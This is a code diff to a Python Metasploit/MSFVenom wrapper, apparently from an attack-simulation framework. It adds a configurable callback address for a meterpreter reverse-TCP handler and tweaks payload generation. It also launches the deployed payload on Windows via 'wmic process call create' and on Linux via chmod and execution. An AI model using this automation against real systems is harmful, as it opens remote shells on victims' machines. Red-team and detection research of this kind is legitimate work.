@@ -43,19 +43,25 @@ class Metasploit():
             kwargs["server"] = self.attacker.get_ip()
             time.sleep(3)   # Waiting for server to start. Or we would get https connection errors when getting the client.
 
-    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler'):
+    def start_exploit_stub_for_external_payload(self, payload='linux/x64/meterpreter_reverse_tcp', exploit='exploit/multi/handler', lhost=None):
         """ Start a metasploit handler and wait for external payload to connect
 
+        @param payload: The payload being used in the implant
+        @param exploit: Normally the generic handler. Overwrite it if you feel lucky
+        @param lhost: the ip of the attack host. Use this to use the attacker ip as seen from the controller.
         @:returns: res, which contains "job_id" and "uuid"
         """
-        exploit = self.get_client().modules.use('exploit', exploit)
+        exp = self.get_client().modules.use('exploit', exploit)
         # print(exploit.description)
         # print(exploit.missing_required)
-        payload = self.get_client().modules.use('payload', payload)
+        pl = self.get_client().modules.use('payload', payload)
         # print(payload.description)
         # print(payload.missing_required)
-        payload["LHOST"] = self.attacker.get_ip()
-        res = exploit.execute(payload=payload)
+        if lhost is None:
+            lhost = self.attacker.get_ip()
+        pl["LHOST"] = lhost
+        print(f"Creating stub for external payload Exploit: {exploit} Payload: {payload}, lhost: {lhost}")
+        res = exp.execute(payload=pl)
         print(res)
         return res
 
@@ -104,7 +110,7 @@ class Metasploit():
 
         while self.get_client().sessions.list == {}:
             time.sleep(1)
-            print(f"Waiting to get any session {retries}")
+            print(f"Metasploit waiting to get any session {retries}")
             retries -= 1
             if retries <= 0:
                 raise MetasploitError("Can not find any session")
@@ -276,6 +282,7 @@ class MSFVenom():
             cmd += f" -e {encoder}"
         if iterations is not None:
             cmd += f" -i {iterations}"
+        cmd += " SessionRetryWait=1 "
 
         # Detecting all the mistakes that already have been made. To be continued
         # Check if encoder supports the architecture
@@ -294,6 +301,7 @@ class MSFVenom():
 
         # Footnote: Currently we only support windows/linux and the "boring" payloads. This will be more tricky as soon as we get creative here
 
+        print(cmd)
         self.attacker.remote_run(cmd)
 
     def generate_and_deploy(self, **kwargs):
@@ -327,8 +335,7 @@ class MSFVenom():
                 cmd = ""
             cmd += f"chmod +x {payload_name}; ./{payload_name}"
         if self.target.get_os() == "windows":
-            cmd = f'{payload_name}'
-
+            cmd = f'wmic process call create "%homepath%\\{payload_name}",""'
         print(cmd)
 
         if self.attack_logger:
